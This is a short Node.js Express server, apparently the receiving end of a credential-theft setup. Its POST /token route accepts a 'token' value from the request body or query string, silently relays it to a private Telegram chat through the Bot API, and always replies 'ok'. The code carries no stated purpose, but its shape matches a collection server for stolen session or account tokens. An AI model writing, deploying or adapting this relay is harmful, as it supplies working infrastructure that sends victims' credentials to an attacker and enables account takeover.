const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.CHAT_ID || '';

app.post('/token', async (req, res) => {
    const token = req.body.token || req.query.token || 'no token';
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: token })
        });
    } catch (e) {}
    res.send('ok');
});

app.listen(process.env.PORT || 3000);
